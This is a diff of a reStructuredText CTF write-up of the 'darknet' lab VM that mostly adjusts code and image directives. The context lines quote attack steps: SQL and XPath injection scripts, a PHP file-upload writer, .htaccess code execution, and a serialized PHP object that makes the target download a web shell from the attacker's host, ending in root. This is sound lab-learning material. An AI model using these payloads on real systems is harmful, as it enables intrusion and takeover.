@@ -19,7 +19,7 @@ Stage 1
 
 First things first: scan the target
 
-.. code-block:: console
+.. code:: console
 
 	root@kali:~# nmap -sV -p- 192.168.56.106
 	
@@ -39,19 +39,19 @@ First things first: scan the target
 Not much to be had here other than a web server. Poking at the RPC ports
 didn't give any results. Browsing to the IP shows me:
 
-.. image:: "http://i.imgur.com/b513tfj.png"
+.. image:: http://i.imgur.com/b513tfj.png
 
 
 There's no :code:`robots.txt` so nothing left to do but run :code:`dirbuster` on it. Using the
 :code:`directory-list-2.3-medium.txt` I'm rewarded with some directories and files that
 might be of interest
 
-.. image:: "http://i.imgur.com/dNQnSQy.png"
+.. image:: http://i.imgur.com/dNQnSQy.png
 
 
 I downloaded the :code:`888.darknet.com.backup` file and took a look at it.
 
-.. code-block:: text
+.. code:: text
 
 	<VirtualHost *:80>
 	    ServerName 888.darknet.com
@@ -63,15 +63,16 @@ I downloaded the :code:`888.darknet.com.backup` file and took a look at it.
 Hrmm.. a virtual host configuration. I added :code:`192.168.56.106 888.darknet.com` to my local :code:`/etc/hosts` 
 and then pointed my browser to :code:`888.darknet.com` to be presented with this:
 
-.. image:: "http://i.imgur.com/PcMHBLd.png"
+.. image:: http://i.imgur.com/PcMHBLd.png
+
 
 Initial thoughts are SQLi, so  I started with some simple SQL injections to see 
 if my hunch is correct. Entering a username like :code:`' or '1'='1` 
-yields an *Ilegal* [sic] message. So this means two things: 1) SQLi is very
+yields an *Ilegal*\ [sic] message. So this means two things: 1) SQLi is very
 probably here becasue 2) our input is filtered. I didn't fancy working out
 what chars I can and can't use so I made a script to do that for me
 
-.. code-block:: python
+.. code:: python
 
 	#!/usr/bin/python
 	
@@ -96,7 +97,7 @@ what chars I can and can't use so I made a script to do that for me
 
 which yielded the following as illegal characters.
 
-.. code-block:: text
+.. code:: text
 
 	,	Illegal
 	-	Illegal
@@ -123,7 +124,7 @@ Ok, so now I get
 Stage 2
 =======
 
-.. image:: "http://i.imgur.com/joaBvqT.png"
+.. image:: http://i.imgur.com/joaBvqT.png
 
 
 Whatever I enter here just goes somewhere without any feedback. This is completely blind
@@ -142,13 +143,13 @@ One useful feature of SQLite that I can exploit in this case, is its ability to 
 To leverage this, I need to find is a folder where I have permission to write files to. 
 I ran :code:`dirbuster` again and now have a few directories to try
 
-.. image:: "http://i.imgur.com/zlFz06Y.png"
+.. image:: http://i.imgur.com/zlFz06Y.png
 
 
 In order to create a file with SQLite I need to attach the file in question as a database.
 So I set about running commands like this
 
-.. code-block:: text
+.. code:: text
 
 	attach database '/home/devnull/public_html/test.php' as db;                
 	drop table if exists db.test;                                                    
@@ -163,7 +164,7 @@ This means no simple php shell. Boooo.
 
 Not to worry, I got this. I knocked up a quick PHP script to do some work for me
 
-.. code-block:: php
+.. code:: php
 
 	if ($_GET["cmd"] == "db") {                                                     
 	    $dbhandler=new SQLite3("/home/devnull/database/888-darknet.db");            
@@ -231,7 +232,7 @@ return the first and only result, and we should get the email as per normal.
 Adding :code:`[2` will error and return nothing as there should only be one result. If this works
 I can be fairly certain that this is an XPath query.
 
-.. image:: "http://i.imgur.com/7jRrIo0.png"
+.. image:: http://i.imgur.com/7jRrIo0.png
 
 
 Excellent, it worked. Now I need to figure out how to make use of this. XPath isn't
@@ -246,7 +247,7 @@ While I played around with this something clicked in my head and I groked enough
 determine the xpath names using the :code:`substring` function. I wrote another python
 script to do the heavy lifting
 
-.. code-block:: python
+.. code:: python
 
 	import requests
 	import string
@@ -283,7 +284,7 @@ script to do the heavy lifting
 
 So I ran this with the current path
 
-.. code-block:: console
+.. code:: console
 
 	root@kali:~/darknet# python xpath.py 
 	u
@@ -294,7 +295,7 @@ So I ran this with the current path
 
 and the parent path
 
-.. code-block:: console
+.. code:: console
 
 	root@kali:~/darknet# python xpath.py ..
 	a
@@ -317,12 +318,12 @@ I am able to login at :code:`signal8.darknet.com/xpanel`
 Stage 4
 =======
 
-.. image:: "http://i.imgur.com/TVG7WhQ.png"
+.. image:: http://i.imgur.com/TVG7WhQ.png
 
 
 Oooh a PHP editor! Sweet... yeah right. Clicking the link goes to a page that shows:
 
-.. code-block:: text
+.. code:: text
 
 	Tr0ll Found
 	
@@ -331,7 +332,7 @@ Oooh a PHP editor! Sweet... yeah right. Clicking the link goes to a page that sh
 So after some manual digging nothing comes up. Time to break out :code:`dirbuster` again
 to find :code:`ploy.php` which presents me with
 
-.. image:: "http://i.imgur.com/DueLt5z.png"
+.. image:: http://i.imgur.com/DueLt5z.png
 
 
 It requires a file which it uploads, as well as a specific combination of checkboxes to be checked.
@@ -342,7 +343,7 @@ All I have to do is iterate of all possible combinations of 4 of these numbers.
 
 Here's my bruteforce script:
 
-.. code-block:: python
+.. code:: python
 
 	import sys
 	import requests
@@ -383,7 +384,7 @@ For this site :code:`AllowOverride All` is on. Most likely going to be something
 do with :code:`.htaccess`. To check this I upload the following file, and then browse to a
 non-existant file, to generate a 404
 
-.. code-block:: text
+.. code:: text
 
 	Order deny,allow
 	Allow from all
@@ -398,7 +399,7 @@ I found this out when the 404 redirect stopped working after uploading an html f
 
 Luckily I discovered that it's possible to execute php code inside the .htaccess file.
 
-.. code-block:: text
+.. code:: text
 
 	AddHandler application/x-httpd-php .htaccess                                    
 	DirectoryIndex .htaccess                                                        
@@ -418,7 +419,7 @@ with base64 and a filename via a :code:`POST` method and write this file out.
 (Note: appending the entire script for DAws or similar didn't work).
 Something like this should work though:
 
-.. code-block:: php
+.. code:: php
 
 	$fp = fopen($_POST['name'], 'wb'); 
 	fwrite($fp, base64_decode($_POST['data'])); 
@@ -442,7 +443,7 @@ once more. Now inside :code:`/var/www` there's some files I missed earlier: :cod
 
 Trying to hit :code:`darknet.com/sec.php` errors. Let's take a look inside of it
 
-.. code-block:: php
+.. code:: php
 
 	<?php
 	
@@ -462,7 +463,7 @@ my suspicion is correct, the :code:`min_uid` and :code:`min_gid` settings are to
 :code:`root` scripts to run. But hey, as luck would have it (thanks q3rv0) :code:`suphp.conf`
 is :code:`777`. So heading straight to :code:`sed`
 
-.. code-block:: console
+.. code:: console
 
 	$ sed -i 's/min_uid=100/min_uid=0/g' suphp.conf
 	sed: couldn't open temporary file ./sedm2LUZQ: Permission denied
@@ -483,7 +484,7 @@ The :code:`Test` class has a rather useful destructor, which,
 will write data to disk and make it world readable. Almost as if that's what
 we're supposed to use. 
 
-.. code-block:: php
+.. code:: php
 
 	<?php
 	
@@ -513,19 +514,19 @@ Now to get DAws on there as root. First things first I need to determine the ser
 string. I do this with a simple PHP script that searialises the :code:`Test` class and
 prints out the string I need. Which is
 
-.. code-block:: text
+.. code:: text
 
 	O:4:"Test":3:{s:3:"url";s:30:"http://192.168.56.101/DAws.txt";s:9:"name_file";s:8:"DAws.php";s:4:"path";s:8:"/var/www"}
 
 Using Burp suite I use a :code:`GET` request to :code:`sec.php`, send it to :code:`Repeater` and convert
 it to a :code:`POST` request with the required payload:
 
-.. image:: "http://i.imgur.com/kiutbRt.png"
+.. image:: http://i.imgur.com/kiutbRt.png
 
 
 Then I, once again, browse to my DAws url and bind a shell to finally get:
 
-.. code-block:: console
+.. code:: console
 
 	# whoami && id
 	root
